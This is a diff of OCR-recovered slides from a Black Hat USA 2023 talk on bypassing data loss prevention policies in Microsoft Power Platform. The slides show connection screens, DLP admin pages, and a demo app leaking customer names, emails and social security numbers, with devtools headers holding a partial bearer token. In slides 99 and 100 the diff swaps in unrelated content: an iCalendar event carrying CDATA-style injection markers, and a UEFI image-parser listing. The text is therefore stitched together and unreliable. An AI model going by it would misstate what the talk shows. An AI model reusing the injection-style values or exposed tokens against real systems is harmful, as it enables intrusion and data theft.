-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 79/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20253
 - Environment
 = £ Edit \@ Share Ill] Delete PD Search
 Connections > jamieredingcustomerdata.file.core.windows.net
@@ -1342,32 +1229,24 @@ Connections > jamieredingcustomerdata.file.core.windows.net
 © tearn Details Apps using this connection Flows using this connection
 PF Apps
 Name
-4 Tables
 o/” Flows Customer Insights Azure
 | Solutions
 | & Connections +a
 More
 €& Power Platform
-Cn Ack ncrrtiial nnarnt
 ```
 
 ## Slide 67
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20253
-- Environment
-Power Apps & zenty Demo (deta
-— gO > Play 12 aed 5 AddtoTeams [A Monitor “ $03 (ZF Ty
-(my Home .
 Apps > Customer Insights Azure
 ! Create
 Details Versions Connections Flows
-() Learn
 Owner
 | Apps Jamie Reding
 Description
@@ -1377,23 +1256,19 @@ o/” Flows Created
 | Solutions
 Modified
 More 7/
-i
 €& Power Platform web link
-https://apps.powerapps.com/play/e/default-fc993 bOf-345b-4d01 -9f67-9ac4a140dd43/a/9bfb0c8d-ee1 3-43a2-9adb-062c504e006b?tenantld=fc993bOf-345b-4d01 -9f67- Th
 9ac4a140dd43
 Mobile QR code
-Cn Ack ncrtiial nnarnt
 ```
 
 ## Slide 68
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 97/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
 Power Apps |
 You need a Power Apps plan
 ```
@@ -1402,11 +1277,10 @@ You need a Power Apps plan
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 97/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
 Power Apps |
 You need a Power Apps plan
 ```
@@ -1415,30 +1289,25 @@ You need a Power Apps plan
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
 Power Apps |
 You need a Power Apps plan
 = a licens at allows sé the
 al for a pren cense or ask your admin
 5
-an rect
 ```
 
 ## Slide 71
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 96/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-USA 20253
-== Microsoft | Power Apps Product v Pricing Partners Learn ¥ Support Community v
 Signin Try free for 30 days
 Announcing new conversational Al features in Power Apps, including generative Al bots for your apps >
 Power Apps
@@ -1469,11 +1338,10 @@ build your own data schema.
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 95/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
 Microsoft
 You've selected Microsoft Power Apps for Developer
 (1) Let's get you started
@@ -1499,11 +1367,10 @@ More than 600 pre-built connectors
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
 Microsoft
 You've selected Microsoft Power Apps for Developer
 1) Let's get you started
@@ -1527,11 +1394,10 @@ e Microsoft Dataverse
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 96/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20253
 Power Apps |
 This app isn't opening correctly
 It looks like this app isn't compliant with the latest data loss prevention policies.
@@ -1542,11 +1408,10 @@ More
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 95/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20253
 Power Apps |
 This app isn't opening correctly
 It looks like this app isn't compliant with the latest data loss prevention policies.
@@ -1560,11 +1425,10 @@ Connector: shared_azurefile cannot be used since it is blocked by your company's
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 95/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20253
 Power Apps |
 This app isn't opening correctly
 It looks like this app isn't compliant with the lates) data loss prevention policies.
@@ -1585,11 +1449,10 @@ But blocked by... DLP?
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
 H Microsoft | Learn Documentation Training Certifications Q&A CodeSamples Assessments Shows Events
 | P& Search | Sign in
 Power Platform Getstarted\ Products Guidance Troubleshooting’ Release plans Resources v
@@ -1647,11 +1510,10 @@ Show 5 more
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20253
 Power Platform admin center
 DLP Policies » New Policy
 (ny Home
@@ -1678,11 +1540,10 @@ Ra-L
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20253
 Power Platform admin center
 DLP Policies » New Policy
 fy Home #3 Set default group
@@ -1692,22 +1553,16 @@ Assign connectors ©
 L Analytics w @ Prebuilt connectors
 Ee Billing (Preview) Business (0) Non-business (1056) | Default Blocked (0) & Search connectors
 © Custom connectors
-o
 Settings Connectors for non-sensitive data. Connectors in this group can’t share data with connectors in other groups. Unassigned
 connectors will show up here by default.
-8]
 Vv
 Resources O Scope
 Name Y Blockable Y Endpoint config
-D
 Help + support
 O Review
-SD
 Data integration . .
 SharePoint : No No
 GP Data (preview)
-Dp
-Ss
 uta Policies “~ S| OneDrive for Business : No
 Power Platform Dvnamics 365 (denrecated) : Yes
 Conference 2023
@@ -1718,11 +1573,10 @@ Register now
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20253
 Power Platform admin center
 DLP Policies » New Policy
 {ny Home & Move to Business Block Configure connector 53 Set default grou
@@ -1741,7 +1595,6 @@ P connectors will show up here by default.
 O Review | Name VY Blockable Y Endpoint config
 &, Data integration
 @® Data (preview) iv) SharePoint = No No
-nt, Policies “~
 . . S| OneDrive for Business : No
 Power Platform
 Conference 2023
@@ -1755,32 +1608,26 @@ Back | | Cancel |
 
 https://www.zenity.io/microsoft-power-platform-dlp-bypass-uncovered-finding-5-parent-and-child-flow-execution/
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 81/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20253
 Power Platform admin center
 DLP Policies » New Policy
 {fn} Home & Move to Business Block Configure connector #3 Set default group
 @ Policy name -
 2) Environments @ One or more of the selected connectors can’t be blocked.
-va .
 Assign connectors ©
-cy
 es eat ell ~ Business (0) Non-business (1056) | Default Blocked (0) P Search connectors
 with enforcing policies ‘=
 for pre-existing resources of
 ic Gin. a Connectors for non-sensitive data. Connectors in this group can't share data with connectors in other groups. Unassigned
 ; EE siccace Directo connectors will show up here by default.
-@
 . | Name Y Blockable Y Endpoint confi
-B, pDatd Microsoft Power Platform P 9
 DLP Bypass Uncovered-
 GP Data Finding #4 iv) Ss) SharePoint : No No
 [nt Polid
 . Read more > S| OneDrive for Business : No
-: :
 co, https://www.zenity.io/microsoft-power-platform-dlp-bypass-uncovered-finding-5-parent-and-child-flow-exec
 Register now
 ```
@@ -1789,29 +1636,23 @@ Register now
 
 https://www.zenity.io/microsoft-power-platform-dlp-bypass-uncovered-finding-5-parent-and-child-flow-execution/ #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20253
 Power Platform admin center
 DLP Policies » New Policy
 Home & Move to Business Block Configure connector #3 Set default group
 @ Policy name
 Environments led connectors can't be blocked.
 brs ©
-al
-2
 Finding #2 - HTTP calls wks
-Sf
 Finding #1 - The problem
 with enforcing DLP policies E a
 for pre-existing resources
 -business (1056) | Default Blocked (0) P Search connectors
-oi
 Yuval Adier
 Customer Success Director
-al
 hsitive data. Connectors in this group can’t share data with connectors in other groups. Unassigned
 p here by default.
 Microsoft Power Platform
@@ -1827,11 +1668,10 @@ Register now
 
 https://www.zenity.io/microsoft-power-platform-dlp-bypass-uncovered-finding-5-parent-and-child-flow-execution/ #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 81/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20253
 Power Platform admin center
 DLP Policies » New Policy
 Home r #3 Set default group
@@ -1846,9 +1686,6 @@ for pre-existing resources
 Give, Microsoft Power Platform oup can't share data with connectors in other groups. Unassigned
 @ Microsoft Power P| DLP Bypass Uncovered -
 Finding #3 - Custom
-al
-oi
-al
 : DLP Bypass Uncov Blockable Endpoint confi
 aq Microsoft Power P yp P 9
 “es DLP Bypass Uncoy Finding #2 — HTTP ae
@@ -1862,11 +1699,10 @@ Register now
 
 https://www.zenity.io/microsoft-power-platform-dlp-bypass-uncovered-finding-5-parent-and-child-flow-execution/ #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-LU
 SA 20253
 Power Platform admin center
 Home
@@ -1889,7 +1725,6 @@ DLP Bypass Uncovy
 Finding #2 - HTTP
 Finding #3 - custom
 connectors
-oe
 Microsoft Power P
 DLP Bypass Uncoy
 DLP Byp
@@ -1897,12 +1732,10 @@ DLP Byp
 Finding #4 - Unblockable wks
 connectors og
 Yuval Adler
-Customer Success Director
 Microsoft Power Platform
 DLP Bypass Uncovered -
 Finding #4 — Unblockable
 connectors
-kable VY
 Read more >
 Read more >
 Register now
@@ -1923,11 +1756,10 @@ No
 
 https://www.zenity.io/microsoft-power-platform-dlp-bypass-uncovered-finding-5-parent-and-child-flow-execution/
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20253
 Power Platform admin center
 Home
 Environ
@@ -1949,7 +1781,6 @@ DLP Bypass Uncovy
 Finding #2 - HTTP
 Finding #3 - custom
 connectors
-oe
 Microsoft Power P|
 DLP Bypass Uncoy
 Finding #3 - Cust
@@ -1957,14 +1788,12 @@ Connectors
 DLP Byp
 Finding #4 - Unblockable
 connectors
-eG
 Microsoft Power P
 DLP Bypass Uncov
 Finding #4 — Unbla
 connectors
 Finding #5 - Parent and
 child flow execution
-e«
 roup
 Microsoft Power Platform
 DLP Bypass Uncovered -
@@ -1988,40 +1817,27 @@ DLP bypass disclosure in process Full writeup → <u>bit.ly/mbrg-bhusa23</u>
 
 @mbrg0 #BHUSA @BlackHatEvents #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-DLP bypass disclosure in process
-Full writeup > bit.ly/mbrg-bhusa23
-```
-
 ## Slide 89
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 78/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
 USA 20
-; Environment
 — 7 New connection L Edit \@ Share ly Delete @ Details
-fn} Home . . .
 Connections in Zenity Demo (default)
-t Create
 Canvas
 () Learn
 EP AGE Name Modified Status
-fH Tables @| Iau blob Stereo ee ungowsnet/parentsrcans 26 min ago Connected
 o/* Flows
-jamieredingcustomerdata.file.core.windows.net 25 min ago Connected
 Al solutions =i Azure File Storage 9
 | % Connections +A mae oes 3 wk ago Connected
 More 0 Edit
 jamieredingcustomerdata.table.core.windows.net/cust... Connected
 Azure Table Storage \@ Share
 e Power Platform i
-oe an . . Delete
 enverprisefinancial financialreports.database.windows.n... Connected
 @® Details
 } enterprisecustomers customercareinsights.database.... 2 wk ago Connected
@@ -2032,25 +1848,21 @@ SQL Server
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20253
 Environment
 Power Apps & Zenity Demo (default)
-£ Edit \@ Share [li] Delete
 Connections > enterprisecustomers customercareinsights.database.windows.net
 + Create
 Learn Details Apps using this connection Flows using this connection
 om Apps Connector name
 SQL Server
-HH Tables
 Description
 Flows Microsoft SQL Server is a relational database management system developed by Microsoft.
 Connect to SQL Server to manage data. You can perform various actions such as create,
 Solutions update, get, and delete on rows in a table.
-| % Connections A
 Status
 More
 Connected
@@ -2066,24 +1878,18 @@ Modified
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20253
 Environment
-Power Apps ® Zeniy Demo (dfou)
-— £ Edit \@ Share Il] Delete PD Search
 Connections > enterprisecustomers customercareinsights.database.windows.net
 + Create
 Learn Details Apps using this connection Flows using this connection
 EA Apps
 Name
-fi Tables
 wo” Flows Customer Insights
 Solutions
-| B¢ . 7 customersinsights2
-onnections
 More
 Customer Insights
 € Power Platform
@@ -2094,24 +1900,18 @@ Customer Insights
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20253
 Environment
-Pauses B Zeniy Demo (detou
-— £ Edit \@ Share [li] Delete P Search
 Connections > enterprisecustomers customercareinsights.database.windows.net
 + Create
 Learn Details Apps using this connection Flows using this connection
 A Apps
 Name
-— Tables
 a” Flows Customer Insights
 Solutions
-. customersinsights2
-| % Connections A
 More
 Customer Insights
 e Power Platform
@@ -2122,15 +1922,12 @@ Customer Insights
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20253
 Environment
 Power Apps & Zenity Demo (default)
-= 2 > Play 2 ed 3 Addto Teams BY Monitor 4 803 F Wi]
-fy Home .
 Apps > Customer Insights
 + Create
 Details Versions Connections Flows
@@ -2146,7 +1943,6 @@ Modified
 More 7/12/2023, 12:06:25 AM
 Web link
 =] Power Platform
-https://apps.powerapps.com/play/e/default-fc993 bOf-345b-4d01-9f67-9ac4a140dd43/a/01cde0ab-4650-4c0f-b73d-63c5e8d55b9e?tenantld=fc993bOf-345b-4d01-9f67- Th
 9ac4a140dd43
 Mobile QR code
 ```
@@ -2159,12 +1955,10 @@ Mobile QR code
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-USA 20e53
 Almost there ...
 Customer Insights needs your permission to use the following. Please allow the
 permissions to proceed.
@@ -2177,11 +1971,10 @@ Signed in
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-black hat ca :
-USA 20253
 Power Apps | Customer Insights BSB oO +s & ?
 [dbo].[Customers] C) Mt
 Search items
@@ -2198,8 +1991,6 @@ ameliaj@zenitydemo.OnMicrosoft.com
 Amelia
 Johnson
 ameliam@zenitydemo.OnMicrosoft.com
-Amelia S =
-c
 Gonzalez —
 andrewc@zenitydemo.OnMicrosoft.com
 ```
@@ -2208,14 +1999,12 @@ andrewc@zenitydemo.OnMicrosoft.com
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-pisek hat
-USA 20253
 Power Apps | Customer Insights
 < [dbo].[Customers]
-CustomerlD
 55677
 Email
 aidenb@zenitydemo.OnMicrosoft.com
@@ -2231,44 +2020,31 @@ SocialSecurityNumber
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 79/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-black hat ie cs
-USA 20e53
 ® [0 | Elements Console Sources Network Performance Memory Application _ Security Lighthouse
-w L _ RB ®O Ya Preserve log Disable cache Nothrotting v Se & &
 -?qsp Invert Hide data URLs All Fetch/XHR JS CSS Img Media Font Doc WS Wasm Manifest Other Has blocked cookies Blocked Requests 3rd-party requests
 \ 500 ms 1000 ms 1500 ms 2000 ms 2500 ms 3000 ms 3500 ms 4000 ms: 4500 ms 5000 ms 5500 ms 6000 ms 6500 ms 7000 ms 7500 ms 8000 ms 8500 ms: 9000 ms oso
 [dbo].[Customers] C) a
-Response Initiator Timing
 r i Name X Headers
 Search items
 B invoke
-“@odata.context": “https //europe-002.azure-apim.net/apim/sql/ff47194e357e459b8756a5F43F59ccc6/$metadata#datasets( ‘customercareinsights .database.windows .net%2Centerprisecustomers' )/tables *%5B)
-( blob:https://pa-static-ms.azur... "value": [
 1
 2
 aidenb@zenitydemo.OnMicrosoft.com 3
 a
-- “ItemInternall 3991 bcef-6542-4723-93e5-fefafb@caaf”
 Aiden :
 - “Email”: “aidenb@zenitydemo.OnMicrosoft.com",
 Brown - "FirstName": "Aiden",
 - “LastName”: “Brown”,
 - “CustomerID”: 55677,
-"@odata.etag”
 - “SocialSecurityNumber": “209-97-8888"
-5 b
 | d ityd OnMi f :
-alexanderw@zenitydemo.OnMicrosoft.cc é
 Alexander -
 Gonzalez 2
 - “SocialSecurityNumber": “209-97-9876"
-7 hb
-: Co
-. + 8 “@odata.etag": “",
-amandas@zenitydemo.OnMicrosoft.com . “TtemInternalId” : "5£32b199-275e-4612-2026-b52903ddea92",
 = "Email": "amandas@zenitydemo.OnMicrosoft.com",
 Amanda - “FirstName
 . - “LastName
@@ -2277,29 +2053,20 @@ Smith 5 CustomerID": 78654,
 9 }
 2 {
 10 “@odata.etag"
-woe . . - “ItemInternall '00e598ec -41ea-42c0-aal7-34c50c42949c",
-ameliaj@zenitydemo.OnMicrosoft.com . “Email": “aneliaj@zenitydemo.OnMicrosoft.con”,
 + - “FirstName”: “Amelia”,
 Amelia - “LastName”: “Johnson”,
 - “CustomerID”: 76234,
 Johnson - "SocialSecurityNumber": "209-97-1111"
-11 }
 - {
 12 “@odata.etag":
 - ItemInternall 1a9cb83a-919e-43ff-9db7-67a02358af83",
 . . . - Email": “ameliam@zenitydemo.OnMicrosoft.com",
-ameliam@zenitydemo.OnMicrosoft.com : “FirstNane™: “Amelia”,
-. = “LastName”: "Gonzalez",
 Amelia = "CustomerID": 74321,
 - “SocialSecurityNumber": “209-97-9876"
 Gonzalez 13 }
 - {
 14 "@odata.etag”:
 - “ItemInternallid
-indri
-b5cb5500-9ecd-44bc-a6el-ce5f1c1cbb16"
-uc@zenitydemo.OnMicrosoft.com",
-Andrew"
 andrewc@zenitydemo.OnMicrosoft.com :
 ```
 
@@ -2307,124 +2074,79 @@ andrewc@zenitydemo.OnMicrosoft.com :
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 83/100 on the text kept, 77/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-black hat Ie oe
-USA 20253
-x Oo Elements Console Sources Network Performance © Memory Application —_ Security Lighthouse @23A8 M1 & : xX
-a JL a R ®O Ya Preserve log Disable cache Nothrotting ¥ “ &% & 8
--?qsp Invert © Hide data URLs All Fetch/XHR JS CSS Img Media Font Doc WS Wasm Manifest Other (© Has blocked cookies ( Blocked Requests ( 3rd-party requests
-i 5000 ms 10000 ms 15000 ms 20000 ms 25000 ms 30000 ms 35000 ms 40000 ms 45000 ms 50000 ms 55000 ms 60000 ms 65000 ms 70000 ms
-[dbo].[Customers] ©) .
-X Headers Preview Response Initiator Timing
-Search items hemne)
-2 invoke exer
-0 blob:https://pa-static-ms.azur... Request URL: https://europe-002.azure-apim.net/invoke
-aidenb@zenitydemo.OnMicrosoft.com
-Request Method: POST
-Aiden Status Code: @200
-Remote Address: 20.86.93,35:443
-Brown _
-Referrer Policy: no-referrer
-Response Headers
-Access-Control-Allow-Origin: *
-alexande rw@zen ityd emo.OnMicrosoft.cc Access-Control-Expose- Content-Encoding, Transfer-Encoding, Vary,x-ms-request-id,x-ms-correlation-id,x-ms-user-agent,Strict-Transport-Security,X-Content-Type-Options,X-Frame-Options,Date,x-ms-connection-gateway-object-id,x-ms-
-Alexander Headers: connection-parameter-set-name,x-ms-environment-id, Timing-Allow-Origin,x-ms-apihub-cached-response,x-ms-apihub-obo
-Cache-Control: no-cache,no-store
-Gonzalez Content-Encoding: gzip
-Content-Type: application/json; charset=utf-8; odata.metadata=minimal
-Date: Sun, 16 Jul 2023 12:01:30 GMT
-Expires: -1
-amandas@zenitydemo.OnMicrosoft.com Pragma: no-cache
-Strict-Transport-Security: max-age=31536000; includeSubDomains
-Amanda Timing-Allow-Origin: *
-Smith Vary: Accept-Encoding
-X-Content-Type-Options: nosniff
-X-Frame-Options: DENY
-X-Ms-Apihub-Cached- true
-ameliaj@zenitydemo.OnMicrosoft.com Response:
-. X-Ms-Apihub-Obo: false
-Amelia X-Ms-Environment-Id: default-fc993b0f-345b-4d01-9f67-9ac4a140dd43
-Johnson X-Ms-Request-Id: 3b699bdc-5186-4a69-8043-fbf014885564
-X-Ms-User-Agent: PowerApps/3.23071.10 (Web Player; AppName=01cde0ab-4650-4c0f-b73d-63c5e8d55b9e)
-Request Headers
-ameliam@zenitydemo.OnMicrosoft.com ehan, Soe teapot
-Amelia :Path: /invoke
-‘Scheme: https
-Gonzalez Accept: application/json
-Accept-Encoding: gzip, deflate, br
-Accept-Language: en-US
-. . Authorization: Bearer
-and rewc@ze n ityde mo.OnMicrosoft.com eyJO0eXAIOUKV1QiLCJhbGciOSUZI1 Nilsing1dCI6li1LSTNROWSOUjdiUm9meG 11lWm9YcWIWkdldylsimtpZCI6li1LSTNROWSOUjdiUm9meG 11Wm9YcWJ|WkdldyJ9.eyJhdWQiOodHRwczovL2FwaWh1YiShenVyZS5jb20iLCjp
+BEGIN:VCALENDAR
+PRODID:-//caldav.icloud.com//CALDAVJ 2116B554//EN
+VERSION:2.0
+BEGIN:VEVENT
+DTEND;TZID=Europe/London:202009[obscured]
+ORGANIZER;CN=[obscured];EMAIL=[obscured]@icloud.com:[obscured]
+[obscured]/principal/
+UID:[obscured]
+DTSTAMP:202103[obscured]
+LOCATION:Home
+SEQUENCE:1
+SUMMARY:Meeting
+LAST-MODIFIED:[obscured]
+DTSTART;TZID=Europe/London:202009[obscured]
+CREATED:202103[obscured]
+ATTENDEE;CN=[obscured];CUTYPE=INDIVIDUAL;PARTSTAT=ACCEPTED;ROLE=CHAIR;
+ EMAIL=[obscured]@icloud.com:[obscured]
+[obscured]/principal/
+DESCRIPTION]]>:x
+ATTENDEE;EMAIL=[obscured];CN=[obscured]:[obscured]
+[obscured]/principal/
+ATTENDEE<![CDATA[:Notes
+
+[red callout pointing at SEQUENCE:1]
+Oh yeah, updated once!
 ```
 
 ## Slide 100
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 85/100 on the text kept, 71/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-bidek hat = is!
-USA 20e53
-re)
-x Oo Elements Console Sources Network Performance | Memory Application —_ Security Lighthouse
-_
-a Oo JL “ QR @® @ Y QO Preservelog © Disablecache Nothrotting ¥
--?qsp Invert ( Hide data URLs All Fetch/XHR JS CSS Img Media Font Doc WS Wasm Manifest Other (© Has blocked cookies () Blocked Requests () 3rd-party requests
-i 5000 ms 10000 ms 15000 ms 20000 ms 25000 ms 30000 ms 35000 ms 40000 ms 45000 ms: 50000 ms 55000 ms 60000 ms 65000 ms 70000 ims|
-.
-[dbo].[Customers]
-r i c Name Headers Preview Response Initiator Timin
-Search items i 9
-D) invoke eazi «
-0 blob:https://pa-static-ms.azur... Request URL: https://europe-002.azure-apim.net/invoke
-aidenb@zenitydemo.OnMicrosoft.com
-Request Method: POST
-Aiden Status Code: @200
-X-Ms-Client-App-Id: /providers/Microsoft.PowerApps/apps/01cdeQab-4650-4cOf-b73d-63c5e8d55b9e
-X-Ms-Client-App-Version: 2022-07-14T08:47:48Z
-X-Ms-Client-Environment-Id: — /providers/Microsoft.PowerApps/environments/default-fc993 bOf-345b-4d01-9f67-9ac4a140dd43
-¢ X-Ms-Client-Object-ld: 71 bbe90d-01e9-4d5c-a684-bd5f3967b8aa
-X-Ms-Client-Request-Id: a4388bf7-366c-4f98-938c-9f61c67cf59a
-X-Ms-Client-Session-Id: 39123203-fdc7-481c-a853-48822b320546
-X-Ms-Client-Tenant-ld: fc993b0f-345b-4d01-9f67-9ac4a140dd43
-X-Ms-Protocol-Semantics: cdp
-X-Ms-Request-Method:
-X-Ms-Request-Url:
-/apim/sql/ff47194e357e459b8756a5f43f59ccc6/v2/datasets/customercareinsights.database.windows.net,enterprisecustomers/tables/%255Bdbo%255D.%255BCustomers%255D/items?
-%24Aorderby=Email+asc&%24select=Email%2CFirstName%2CLastName%2CCustomerlD%2CSocialSecurityNumber&%24top= 100
-X-Ms-User-Agent:
-Amelia X-Ms-Environment-Id: default-fc993b0f-345b-4d01-9167-9ac4a140dd43
-Johnson X-Ms-Request-Id: 3b699bdc-5186-4a69-8043-fbf014885564
-X-Ms-User-Agent: PowerApps/3.23071.10 (Web Player; AppName=01cdeOab-4650-4c0f-b73d-63c5e8d55b9e)
-Request Headers
-ameliam@zenitydemo.OnMicrosoft.com etna oe
-Amelia :Path: /invoke
-‘Scheme: https
-Gonzalez Accept: application/json
-Accept-Encoding: gzip, deflate, br
-Accept-Language: en-US.
-Authorization: Bearer
-and rewc@zenitydemo.OnMicrosoft.com eyJ0eXAIOUKV1QiLC/hbGciOUSUZI1Nilsing1dCI6li1LSTNROWSOUjdiUm9meG 1IWm9YcWsIWkdldylsimtpZCI6li1 LSTNROWSOUjdiUm9meG 11Wm9YcWJIWkdldyJ9.eyJhdWQiOUodHR\
+Different Shades of UEFI Image Parsers
+
+BmpDecoderDxe-A9F634A5-29F1-4456-A9D5-6E24B88BDB65
+TgaDecoderDxe-ADCCA887-5330-414A-81A1-5B578146A397
+PngDecoderDxe-C1D5258B-F61A-4C02-9293-A005BEB3EAA1
+JpegDecoderDxe-2707E46D-DBD7-41C2-9C04-C9FDB8BAD86C
+PcxDecoderDxe-A8F634A5-28F1-4456-A9D5-7E24B99BDB65
+GifDecoderDxe-1353DE63-B74A-4BEF-80FD-2C5CFA83040B
+
+SystemImageDecoderDxe-5F65D21A-8867-45D3-A41A-526F9FE2C598
+
+AMITSE-B1DA0ADF-4F77-4070-A88E-BFFE1C60529A
+
+MdeModulePkg/Library/BaseBmpSupportLib/BmpSupportLib.c
+
+insyde
+phoenix technologies
+ami
+tianocore
 ```
 
 ## Slide 101
